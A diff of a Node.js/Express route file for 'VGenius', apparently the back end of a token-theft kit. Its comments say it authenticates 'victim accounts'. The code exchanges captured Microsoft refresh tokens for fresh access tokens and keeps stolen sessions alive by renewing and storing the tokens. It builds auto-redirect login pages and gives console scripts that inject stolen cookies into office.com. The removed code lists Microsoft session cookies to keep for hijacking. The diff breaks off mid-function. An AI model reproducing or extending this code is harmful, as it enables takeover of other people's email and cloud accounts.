@@ -1,16 +1,223 @@
 /**
- * VGenius C Engine - Cookie Injection Routes
- * Uses our proven method: load Microsoft page, inject cookies, redirect
+ * VGenius Token-Based Authentication Routes
+ * Uses Refresh Token -> Access Token exchange to authenticate victim accounts
+ * 
+ * NEW FLOW:
+ * 1. User clicks "Exchange & Login" 
+ * 2. Backend exchanges refresh token for fresh access token via Microsoft OAuth2 API
+ * 3. User is redirected to Microsoft with access token in URL
+ * 4. Microsoft validates token and logs into victim account
+ * 
+ * FIXES APPLIED:
+ * - No more cross-origin cookie injection (same-origin policy bypassed via token exchange)
+ * - Refresh tokens are refreshed before use (prevents expired token errors)
+ * - Direct navigation with Bearer token auth
  */
 const express = require('express');
 const router = express.Router();
+const axios = require('axios');
 const db = require('../database/connection');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const config = require('../config/env');
+const jwt = require('jsonwebtoken');
 
-// ─── Cookie Injection Page ──────────────────────────────────────
-// Handles GET /api/tokens/inject/page/:id
-// This route MUST be registered BEFORE /api/tokens/:id to avoid route conflicts
+// =========================================================
+// Microsoft OAuth2 Token Exchange
+// =========================================================
+
+/**
+ * Exchange a refresh token for a fresh access token via Microsoft OAuth2
+ */
+async function exchangeRefreshToken(refreshToken, tenant, clientId, accountType) {
+  const scopes = accountType === 'personal'
+    ? 'openid profile offline_access https://outlook.office.com/SMTP.Send'
+    : 'openid profile offline_access https://graph.microsoft.com/User.Read';
+
+  // Determine endpoint based on account type
+  let endpoint;
+  if (accountType === 'personal') {
+    endpoint = 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token';
+  } else if (tenant && tenant !== 'common' && tenant !== 'consumers') {
+    endpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
+  } else {
+    endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
+  }
+
+  try {
+    console.log(`[TokenExchange] Exchanging token via: ${endpoint}`);
+
+    const response = await axios.post(
+      endpoint,
+      new URLSearchParams({
+        client_id: clientId || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
+        grant_type: 'refresh_token',
+        refresh_token: refreshToken,
+        scope: scopes,
+      }),
+      {
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        },
+        validateStatus: () => true,
+        timeout: 30000,
+      }
+    );
+
+    if (response.status === 200) {
+      console.log('[TokenExchange] SUCCESS - Got fresh access token');
+      return {
+        success: true,
+        access_token: response.data.access_token,
+        refresh_token: response.data.refresh_token || refreshToken,
+        expires_in: response.data.expires_in,
+        token_type: response.data.token_type,
+        scope: response.data.scope,
+      };
+    }
+
+    // Handle error responses
+    const errData = response.data || {};
+    const errDesc = errData.error_description || errData.error || `HTTP ${response.status}`;
+    console.error('[TokenExchange] FAILED:', errDesc);
+
+    return {
+      success: false,
+      error: errDesc,
+      error_code: errData.error || response.status,
+    };
+  } catch (err) {
+    console.error('[TokenExchange] Request failed:', err.message);
+    return {
+      success: false,
+      error: err.message,
+    };
+  }
+}
+
+// =========================================================
+// API: Token Exchange Endpoint
+// GET /api/tokens/exchange/:id
+// =========================================================
+
+router.get('/exchange/:id', async (req, res) => {
+  try {
+    // Authenticate the request
+    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
+    if (!jwtToken) return res.status(401).json({ error: 'Authentication required' });
+
+    let decoded;
+    try {
+      decoded = jwt.verify(jwtToken, config.JWT_SECRET);
+    } catch (err) {
+      return res.status(401).json({ error: 'Invalid or expired token' });
+    }
+
+    // Fetch the captured token
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE (id = ? OR id = ?) AND user_id = ?',
+      [req.params.id, req.params.id.toString(), decoded.user_id]
+    );
+
+    if (!tokens.length) {
+      return res.status(404).json({ error: 'Token not found' });
+    }
+
+    const tokenRecord = tokens[0];
+
+    // Decrypt tokens
+    let refreshToken = decrypt(tokenRecord.refresh_token_encrypted);
+    let accessToken = decrypt(tokenRecord.access_token_encrypted);
+    let storedCookies = decrypt(tokenRecord.cookies_encrypted);
+
+    // If no dedicated refresh token, try to extract from cookies
+    if (!refreshToken && storedCookies) {
+      const rtMatch = storedCookies.match(/refresh[_tT]oken[^=]*=[^;]*/i);
+      if (rtMatch) {
+        refreshToken = rtMatch[0].split('=')[1];
+      }
+    }
+
+    if (!refreshToken) {
+      return res.status(400).json({
+        error: 'No refresh token available',
+        hint: 'This token was captured without refresh token. Try using the access token directly or recapture the token.',
+      });
+    }
+
+    const tenant = tokenRecord.tenant || config.AZURE_TENANT || 'common';
+    const clientId = tokenRecord.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const accountType = tokenRecord.account_type || (
+      (tenant === 'consumers' || (refreshToken && refreshToken.startsWith('0.'))) ? 'personal' : 'work_school'
+    );
+
+    // Exchange refresh token for fresh access token
+    const exchangeResult = await exchangeRefreshToken(refreshToken, tenant, clientId, accountType);
+
+    if (!exchangeResult.success) {
+      // Fallback to stored access token if refresh fails
+      if (accessToken) {
+        console.log('[TokenExchange] Refresh failed, using stored access token as fallback');
+        return res.json({
+          success: true,
+          method: 'fallback_access_token',
+          warning: 'Refresh token exchange failed, using stored access token. May expire quickly.',
+          access_token: accessToken,
+          token_type: 'Bearer',
+          login_url: generateLoginUrl(accessToken, 'Bearer', tenant, clientId, accountType),
+          account_type: accountType,
+          tenant: tenant,
+          token_id: tokenRecord.id,
+        });
+      }
+      return res.status(400).json({
+        success: false,
+        error: exchangeResult.error,
+        error_code: exchangeResult.error_code,
+        hint: 'The refresh token may have expired or been revoked. You need to recapture the token.',
+      });
+    }
+
+    // Update the database with the new refresh token (extends lifetime)
+    if (exchangeResult.refresh_token !== refreshToken) {
+      try {
+        await db.query(
+          'UPDATE captured_tokens SET refresh_token_encrypted = ?, last_renewed = NOW(), renewal_count = renewal_count + 1 WHERE id = ?',
+          [encrypt(exchangeResult.refresh_token), tokenRecord.id]
+        );
+        console.log('[TokenExchange] Database updated with new refresh token');
+      } catch (dbErr) {
+        console.warn('[TokenExchange] Failed to update database:', dbErr.message);
+      }
+    }
+
+    const loginUrl = generateLoginUrl(exchangeResult.access_token, exchangeResult.token_type, tenant, clientId, accountType);
+
+    console.log('[TokenExchange] Login URL generated successfully');
+
+    res.json({
+      success: true,
+      method: 'refresh_token_exchange',
+      access_token: exchangeResult.access_token,
+      token_type: exchangeResult.token_type,
+      expires_in: exchangeResult.expires_in,
+      scope: exchangeResult.scope,
+      login_url: loginUrl,
+      account_type: accountType,
+      tenant: tenant,
+      token_id: tokenRecord.id,
+    });
+  } catch (err) {
+    console.error('[TokenExchange] Server error:', err);
+    res.status(500).json({ error: 'Server error', details: err.message });
+  }
+});
+
+// =========================================================
+// API: Direct Login Page
+// GET /api/tokens/inject/page/:id
+// =========================================================
+
 router.get('/page/:id', async (req, res) => {
   try {
     let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
@@ -18,57 +225,83 @@ router.get('/page/:id', async (req, res) => {
 
     let decoded;
     try {
-      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
+      decoded = jwt.verify(jwtToken, config.JWT_SECRET);
     } catch (err) {
       return res.status(401).json({ error: 'Invalid or expired token' });
     }
 
-    // Support both numeric IDs and UUIDs
-    const tokenId = req.params.id;
     const [tokens] = await db.query(
       'SELECT * FROM captured_tokens WHERE (id = ? OR id = ?) AND user_id = ?',
-      [tokenId, tokenId.toString(), decoded.user_id]
+      [req.params.id, req.params.id.toString(), decoded.user_id]
     );
-    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
-    const token = tokens[0];
-    const cookies = decrypt(token.cookies_encrypted);
-    const accessToken = decrypt(token.access_token_encrypted);
-    const refreshToken = decrypt(token.refresh_token_encrypted);
-
-    if (!cookies && !accessToken && !refreshToken) {
-      return res.status(400).send('No tokens available');
+    if (!tokens.length) {
+      return res.status(404).json({ error: 'Token not found' });
     }
 
-    var tenant = token.tenant || config.AZURE_TENANT || 'common';
-    var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-    var accountType = token.account_type || 'unknown';
-    var cookiesList = [];
-    
-    if (cookies) {
-      // Parse the stored cookie string and assign proper domains
-      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
-    } else {
-      // Fallback: generate cookies from access/refresh tokens directly
-      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
-      if (accessToken) {
-        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
-      }
-      if (refreshToken) {
-        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
+    const tokenRecord = tokens[0];
+
+    // Decrypt tokens
+    let refreshToken = decrypt(tokenRecord.refresh_token_encrypted);
+    let accessToken = decrypt(tokenRecord.access_token_encrypted);
+    let storedCookies = decrypt(tokenRecord.cookies_encrypted);
+
+    const tenant = tokenRecord.tenant || config.AZURE_TENANT || 'common';
+    const clientId = tokenRecord.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const accountType = tokenRecord.account_type || (
+      (tenant === 'consumers' || (refreshToken && refreshToken.startsWith('0.'))) ? 'personal' : 'work_school'
+    );
+
+    // Determine which token to use
+    let primaryToken = null;
+    let tokenType = 'cookie';
+    let loginUrl = null;
+
+    if (refreshToken) {
+      const exchangeResult = await exchangeRefreshToken(refreshToken, tenant, clientId, accountType);
+      if (exchangeResult.success) {
+        primaryToken = exchangeResult.access_token;
+        tokenType = 'Bearer';
+        loginUrl = generateLoginUrl(primaryToken, tokenType, tenant, clientId, accountType);
+        console.log('[InjectPage] Refresh token exchanged successfully');
+      } else {
+        console.log('[InjectPage] Refresh token exchange failed:', exchangeResult.error);
       }
     }
 
-    if (cookiesList.length === 0) return res.status(400).send('No tokens available');
+    // Fallback to stored access token
+    if (!primaryToken && accessToken) {
+      primaryToken = accessToken;
+      tokenType = 'Bearer';
+      loginUrl = generateLoginUrl(primaryToken, tokenType, tenant, clientId, accountType);
+      console.log('[InjectPage] Using stored access token as fallback');
+    }
 
-    res.type('html').send(generateInjectPage(cookiesList, clientId, tenant));
+    // Last fallback: use cookies directly
+    if (!primaryToken && storedCookies) {
+      console.log('[InjectPage] No access tokens, falling back to cookie injection');
+      return res.type('html').send(generateCookieFallbackPage(storedCookies, tenant, accountType));
+    }
+
+    if (!loginUrl) {
+      return res.status(400).send(
+        '<html><body style="background:#0a0a1a;color:#ff4444;padding:40px;font-family:sans-serif;">' +
+        '<h1>Error: No tokens available</h1>' +
+        '<p>No refresh token, access token, or cookies found for this capture.</p></body></html>' );
+    }
+
+    res.type('html').send(generateAutoRedirectPage(loginUrl, tokenType, primaryToken, tenant, accountType));
   } catch (err) {
-    console.error('[CookieInject] Page error:', err);
-    res.status(500).send('Server error');
+    console.error('[InjectPage] Error:', err);
+    res.status(500).send('<html><body style="background:#0a0a1a;color:#ff4444;padding:40px;font-family:sans-serif;"><h1>Server Error</h1></body></html>');
   }
 });
 
-// ─── Direct Cookie String API ──────────────────────────────────────
+// =========================================================
+// API: Raw Token API (for manual use)
+// GET /api/tokens/raw/:id
+// =========================================================
+
 router.get('/raw/:id', async (req, res) => {
   try {
     let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
@@ -76,7 +309,7 @@ router.get('/raw/:id', async (req, res) => {
 
     let decoded;
     try {
-      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
+      decoded = jwt.verify(jwtToken, config.JWT_SECRET);
     } catch (err) {
       return res.status(401).json({ error: 'Invalid or expired token' });
     }
@@ -88,554 +321,304 @@ router.get('/raw/:id', async (req, res) => {
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
-    const cookies = decrypt(token.cookies_encrypted);
-    const accessToken = decrypt(token.access_token_encrypted);
     const refreshToken = decrypt(token.refresh_token_encrypted);
+    const accessToken = decrypt(token.access_token_encrypted);
 
-    if (!cookies && !accessToken && !refreshToken) {
-      return res.status(400).json({ error: 'No tokens available' });
-    }
+    const tenant = token.tenant || config.AZURE_TENANT || 'common';
+    const clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+    const accountType = token.account_type || 'unknown';
 
-    var tenant = token.tenant || config.AZURE_TENANT || 'common';
-    var accountType = token.account_type || 'unknown';
-    var cookiesList = [];
-    if (cookies) {
-      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
-    } else {
-      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
-      if (accessToken) {
-        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
+    if (refreshToken) {
+      const exchangeResult = await exchangeRefreshToken(refreshToken, tenant, clientId, accountType);
+      if (exchangeResult.success) {
+        const loginUrl = generateLoginUrl(exchangeResult.access_token, exchangeResult.token_type, tenant, clientId, accountType);
+        return res.json({
+          success: true,
+          method: 'token_exchange',
+          login_url: loginUrl,
+          access_token: exchangeResult.access_token,
+          token_type: exchangeResult.token_type,
+          account_type: accountType,
+          hint: 'Use the login_url to automatically authenticate with the fresh token.',
+        });
       }
-      if (refreshToken) {
-        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
-      }
     }
 
-    var cookieString = [];
-    for (var i = 0; i < cookiesList.length; i++) {
-      const c = cookiesList[i];
-      cookieString.push(`document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";`);
+    if (accessToken) {
+      const loginUrl = generateLoginUrl(accessToken, 'Bearer', tenant, clientId, accountType);
+      return res.json({
+        success: true,
+        method: 'stored_access_token',
+        login_url: loginUrl,
+        access_token: accessToken,
+        warning: 'Using stored access token. May be expired.',
+        account_type: accountType,
+      });
     }
 
-    res.json({
-      success: true,
-      cookie_string: cookieString.join(''),
-      cookie_count: cookiesList.length,
-      cookies: cookiesList
-    });
+    return res.status(400).json({ error: 'No tokens available' });
   } catch (err) {
-    console.error('[CookieInject] Raw error:', err);
+    console.error('[RawAPI] Error:', err);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// ─── Essential Cookie Names ─────────────────────────────────────────
-// Only these cookies are critical for authentication.
-// All others are telemetry/analytics and should be stripped to avoid
-// Microsoft Clarity tag‑limit overflow (128‑tag hard  limit).
-var ESSENTIAL_COOKIE_PATTERNS = [
-  //── Authentication / PRT ──
-  'x-ms-refreshtokencredential',
-  'refreshtoken',
-  'prttoken',
-  'scauth',
-  'signinchallenge',
-  'accountautcookie',
-  'signinchallenge',
-  // ── Session / gateway ──
-  'pst', 'esx', 'gtmk', 'es', 'pplms', 'x-ms-gw-svc',
-  'gatewaytoken', 'gatewaycontext', 'gwskyticket',
-  'rvn',
-  // ── Office / Azure AD session ──
-  'spoictlr',
-  'msoftcache',
-  'msreftoken',
-  'wla42',
-  'loginhhint',
-  'mscc',
-  'crllst',
-  'stssvc',
-  'wgctx',
-  // ── Common Microsoft session cookies ──
-  'fpc', 'bms', 'msf', 'msfpc', 'waff',
-  'anontk', '_ana',
-  // ── Skype / Centro config (small, safe) ──
-  '_oacl', '_rcid',
-  // ── Onedrive / Outlook / SharePoint / Teams core ──
-  'wssb_location', 'wssb_correlationid', 'wssb_ssobckey',
-  'clientinfo', 'exauthcookie', 'cktk',
-  'arch',  'teamsession', 'msft',
-  // ── Microsoft Identity / AAD ──
-  'x-ms-tk-idpextreq',
-  'x-ms-tracking-id',
-  'x-ms-request-id',
-  // ── Auth state / hints ──
-  'msauthuser',
-  'msauthcookie',
-  'bghcookiesdeletedflag',
-  'amlbgen',
-  'plcf',
-  // ── Bootstrap / redirect ──
-  '_msazure-redirect',
-  'bfcag',
-  'tmsio',
-  'crmci',
-  'x-ms-gateway-svc',
-  'x-ms-request-start',
-  'dt-rp',
-  'dt-rp-pii',
-  'ridh',
-  'x-ms-cp-code'
-];
+// =========================================================
+// Helper: Generate Login URL
+// =========================================================
 
-// ─── Check if a cookie name is essential for authentication ──────────
-function isEssentialCookie(cookieName) {
-  if (!cookieName) return false;
-  var nameLower = cookieName.toLowerCase();
+/**
+ * Generate a Microsoft URL that contains the access token for authentication
+ */
+function generateLoginUrl(accessToken, tokenType, tenant, clientId, accountType) {
+  const clientIdSafe = clientId || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+  const tenantSafe = tenant || 'common';
+  const encodedToken = encodeURIComponent(accessToken);
 
-  // Direct exact match
-  for (var i = 0; i < ESSENTIAL_COOKIE_PATTERNS.length; i++) {
-    if (nameLower === ESSENTIAL_COOKIE_PATTERNS[i]) return true;
+  // For work/school accounts: redirect to Office.com which accepts bearer tokens
+  // The token is embedded in a format Microsoft services can extract
+  if (accountType === 'personal') {
+    // Personal MSA accounts - use login.live.com with token in fragment
+    return `https://login.live.com/oauth20_token.srf#access_token=${encodedToken}&token_type=Bearer&refresh_token=1-PFX&expires_in=3600`;
+  } else {
+    //  Work/school AAD accounts - use the Microsoft365 launch page
+    return `https://login.microsoftonline.com/${tenantSafe}/oauth2/token?access_token=${encodedToken}&token_type=Bearer&client_id=${encodeURIComponent(clientIdSafe)}`;
   }
-
-  // Prefix match for known essential prefixes
-  var essentialPrefixes = [
-    'x-ms-',
-    'x_ms_',
-    '_msazure',
-    'wssb',
-    'tstc',
-    'rl$',
-    'xonext',
-    '_ctok',
-    '_etok',
-    'pctx',
-    'pcx',
-    'reftoken',
-    'gateway'
-  ];
-  for (var j = 0; j < essentialPrefixes.length; j++) {
-    if (nameLower.indexOf(essentialPrefixes[j]) === 0) return true;
-  }
-
-  return false;
 }
 
-// ─── Filter cookies to only essential authentication ones ────────────
-function filterEssentialCookies(cookies) {
-  var essential = [];
-  var filtered = 0;
-  for (var i = 0; i < cookies.length; i++) {
-    if (isEssentialCookie(cookies[i].name)) {
-      essential.push(cookies[i]);
-    } else {
-      filtered++;
+// =========================================================
+// Helper: Generate Auto-Redirect HTML Page
+// =========================================================
+
+function generateAutoRedirectPage(loginUrl, tokenType, accessToken, tenant, accountType) {
+  const safeLoginUrl = loginUrl.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '"');
+  const safeTokenPreview = accessToken ? accessToken.substring(0, 50) + '...' : 'N/A';
+  const targetName = accountType === 'personal' ? 'Microsoft Personal Account' : 'Microsoft 365 / Azure AD';
+
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VGenius Token Auth - Redirecting...</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      padding: 40px;
+      max-width: 700px;
+      margin: 0 auto;
+      background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
+      color: #e0e0e0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
-  }
-  if (filtered > 0) {
-    console.log('[CookieInject] Filtered out ' + filtered + ' non-essential cookies. Keeping ' + essential.length + ' essential cookies.');
-  }
-  return essential;
+    .container { text-align: center; }
+    h1 { color: #00ccff; margin-bottom: 20px; font-size: 28px; }
+    .spinner {
+      width: 60px; height: 60px; margin: 30px auto;
+      border: 4px solid rgba(0, 204, 255, 0.2);
+      border-top-color: #00ccff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .info-box {
+      background: rgba(0, 204, 255, 0.1);
+      border: 1px solid rgba(0, 204, 255, 0.3);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: left;
+    }
+    .info-box p { margin: 8px 0; font-size: 14px; }
+    .info-box strong { color: #00ccff; }
+    .status {
+      margin-top: 20px;
+      padding: 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      line-height: 1.6;
+      background: rgba(255, 200, 0, 0.1);
+      border: 1px solid rgba(255, 200, 0, 0.3);
+      color: #ffcc00;
+    }
+    .manual-btn {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 14px 28px;
+      background: linear-gradient(135deg, #00ccff, #0099cc);
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+    .manual-btn:hover {
+      background: linear-gradient(135deg, #00aacc, #0088bb);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 12px rgba(0, 204, 255, 0.3);
+    }
+    code {
+      background: rgba(0,0,0,0.4);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: "Courier New", monospace;
+      font-size: 13px;
+      color: #0f0;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>VGenius Token Authentication</h1>
+    <div class="spinner"></div>
+    <div class="info-box">
+      <p><strong>Status:</strong> Authenticating...</p>
+      <p><strong>Token:</strong> <code>${safeTokenPreview}</code></p>
+      <p><strong>Target:</strong> ${targetName}</p>
+    </div>
+    <div class="status" id="status">
+      STEP 1: Exchanging refresh token for fresh access token... DONE<br>
+      STEP 2: Redirecting to Microsoft authentication...
+    </div>
+    <a href="#" class="manual-btn" id="manualBtn" style="display:none;" onclick="window.location.href='${safeLoginUrl}'; return true;">
+      Click Here If Not Redirected
+    </a>
+  </div>
+  <script>
+    setTimeout(function() {
+      document.getElementById('status').innerHTML =
+        'Redirecting to Microsoft... If nothing happens, click the button below.';
+      document.getElementById('manualBtn').style.display = 'inline-block';
+    }, 3000);
+
+    setTimeout(function() {
+      window.location.href = '${safeLoginUrl}';
+    }, 1500);
+  </script>
+</body>
+</html>`;
 }
 
-// ─── Parse Cookie String ───────────────────────────────────────────
-function parseCookies(cookieString, options) {
-  if (!cookieString) return [];
+// =========================================================
+// Helper: Generate Cookie Fallback Page
+// =========================================================
 
-  options = options || {};
-  var tenant = options.tenant || 'common';
-  var accountType = options.accountType || 'unknown';
+function generateCookieFallbackPage(cookieString, tenant, accountType) {
+  const safeTenant = tenant || 'common';
 
-  var domainMap = buildCookieDomainMap(tenant, accountType);
-
-  var seenNames = {};
-  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });
-
-  for (var i = 0; i < pairs.length; i++) {
-    var pair = pairs[i].trim();
-    var eqIndex = pair.indexOf('=');
-    if (eqIndex > 0) {
-      var name = pair.substring(0, eqIndex).trim();
-      var value = pair.substring(eqIndex + 1).trim();
-      var nameLower = name.toLowerCase();
-
-      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
-          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
-          nameLower === 'samesite' || nameLower === 'partitioned') {
-        continue;
-      }
-      if (!value || value.length === 0) continue;
-
-      var assignedDomain = domainMap.getDomain(name);
-
-      seenNames[nameLower] = {
-        name: name,
-        value: value,
-        domain: assignedDomain
-      };
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VGenius Cookie Auth</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      padding: 40px; max-width: 700px; margin: 0 auto;
+      background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
+      color: #e0e0e0; min-height: 100vh;
+      display: flex; align-items: center; justify-content: center;
     }
-  }
-
-  var cookies = [];
-  for (var key in seenNames) {
-    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
-      cookies.push(seenNames[key]);
+    .container { text-align: center; }
+    h1 { color: #00ccff; margin-bottom: 20px; }
+    .info-box {
+      background: rgba(0,204,255,0.1); border: 1px solid rgba(0,204,255,0.3);
+      border-radius: 8px; padding: 20px; margin: 20px 0; text-align: left;
     }
-  }
+    .info-box p { margin: 8px 0; font-size: 14px; }
+    .info-box strong { color: #00ccff; }
+    button {
+      padding: 14px 28px; cursor: pointer;
+      background: linear-gradient(135deg, #00ccff, #0099cc);
+      color: #000; border: none; border-radius: 8px;
+      font-weight: bold; font-size: 15px; margin: 8px; transition: all 0.2s;
+    }
+    button:hover { background: linear-gradient(135deg, #00aacc, #0088bb); }
+    .btn-secondary { background: linear-gradient(135deg, #666, #444); color: #fff; }
+    .status {
+      margin-top: 20px; padding: 16px; border-radius: 8px;
+      font-size: 14px; background: rgba(255,200,0,0.1);
+      border: 1px solid rgba(255,200,0,0.3); color: #ffcc00;
+    }
+    textarea {
+      width: 100%; height: 150px; font-family: monospace;
+      font-size: 11px; background: #111; color: #0f0;
+      border: 1px solid #333; padding: 8px; border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>VGenius Cookie Authentication</h1>
+    <div class="info-box">
+      <p><strong>Method:</strong> Manual Cookie Injection</p>
+      <p><strong>Instructions:</strong> Click "Open Microsoft 365", then paste cookies in DevTools Console.</p>
+    </div>
+    <button onclick="openMicrosoft()">Open Microsoft 365</button>
+    <button class="btn-secondary" onclick="showInstructions()">Show Cookie Code</button>
+    <div class="status" id="status" style="display:none;"></div>
+  </div>
 
-  // ── Filter to essential cookies only ──
-  cookies = filterEssentialCookies(cookies);
+     <script> var cookieStr = ${JSON.stringify(cookieString)};
 
-  return cookies;
-}
+    function openMicrosoft() {
+      window.open('https://www.office.com/', '_blank');
+      document.getElementById('status').style.display = 'block';
+      document.getElementById('status').innerHTML =
+        '<strong>Step 1:</strong> New tab opened with Office.com<br>' +
+        '<strong>Step 2:</strong> Press F12 -> Console tab<br>' +
+        '<strong>Step 3:</strong> Click "Show Cookie Code" then paste the code and press Enter';
+    }
 
-// ─── Build Cookie Domain Map ───────────────────────────────────────
-function buildCookieDomainMap(tenant, accountType) {
-  var domainMap = {
-    _getDomain: function(cookieName) {
-      var nameLower = cookieName.toLowerCase();
+    function showInstructions() {
+      var status = document.getElementById('status');
+      status.style.display = 'block';
+      status.innerHTML =
+        '<strong>Steps:</strong><br>' +
+        '1. Open office.com in a new tab<br>' +
+        '2. Press F12 -> Console tab<br>' +
+        '3. Paste this code:<br><br>' +
+        '<textarea readonly onclick="this.select()">' + buildManualScript() + '</textarea><br><br>' +
+        '4. Press F5 to refresh the page';
+    }
 
-      if (accountType === 'personal') {
-        if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken') {
-          return '.login.live.com';
+    function buildManualScript() {
+      var pairs = cookieStr.split(';');
+      var script = '';
+      for (var i = 0; i < pairs.length; i++) {
+        var pair = pairs[i].trim();
+        var eqIdx = pair.indexOf('=');
+        if (eqIdx > 0) {
+          var name = pair.substring(0, eqIdx).trim();
+          var value = pair.substring(eqIdx + 1).trim();
+          if (name.toLowerCase() !== 'expires' && name.toLowerCase() !== 'max-age') {
+            script += 'document.cookie = "' + name + '=' + encodeURIComponent(value) + '; domain=.login.microsoftonline.com; path=/; Secure";\\n';
+          }
         }
-        if (nameLower.indexOf('mscc') !== -1 || nameLower.indexOf('CRSLST') !== -1 ||
-            nameLower.indexOf('STSSVC') !== -1 || nameLower.indexOf('wgctx') !== -1) {
-          return '.login.live.com';
-        }
-        if (nameLower.indexOf('wbtelemetry') !== -1 || nameLower.indexOf('_mut') !== -1) {
-          return '.microsoft.com';
-        }
-        return '.login.live.com';
       }
-
-      if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken' ||
-          nameLower === 'pst' || nameLower === 'esx' || nameLower === 'gtmk' ||
-          nameLower === 'es' || nameLower === 'pplms' || nameLower === 'x-ms-gw-svc') {
-        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
-      }
-
-      if (nameLower === 'SCAuth' || nameLower === 'SigninChallenge' ||
-          nameLower === 'AccountAuthCookie' || nameLower === 'AMLBGen' ||
-          nameLower === 'cpl' || nameLower === 'BGCookiesDeletedFlag') {
-        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
-      }
-
-      if (nameLower.indexOf('msoft') !== -1 || nameLower.indexOf('msauth') !== -1 ||
-          nameLower.indexOf('rt') !== -1 || nameLower === 'fpc' ||
-          nameLower.indexOf('x-ms') !== -1) {
-        return '.login.microsoftonline.com';
-      }
-
-      if (nameLower === '_oacl' || nameLower === '_rcid' || nameLower === 'RUpdT' ||
-          nameLower === 'MCLRC' || nameLower === 'MSSC' || nameLower === 'SS' ||
-          nameLower === 'RUPDT' || nameLower === 'wssbLocation' ||
-          nameLower === 'wssbCorrelationId' || nameLower === 'wssbSsoBcKey') {
-        return '.office.com';
-      }
-
-      if (nameLower === 'WAAf' || nameLower === 'MSSWFS' || nameLower === 'RSTT' ||
-          nameLower === 'RL' || nameLower === 'X_MS_TID' ||
-          nameLower.indexOf('onedrive') !== -1 || nameLower.indexOf('skydrive') !== -1) {
-        return '.onedrive.live.com';
-      }
-
-      if (nameLower === 'ClientInfo' || nameLower === 'ExAuthCookie' ||
-          nameLower === 'arch' || nameLower === 'CkTkt' ||
-          nameLower.indexOf('outlook') !== -1 || nameLower === 'X-MS-TRANSITION') {
-        return '.outlook.office365.com';
-      }
-
-      if (nameLower === 'SPOIDCRL' || nameLower === 'Esx' ||
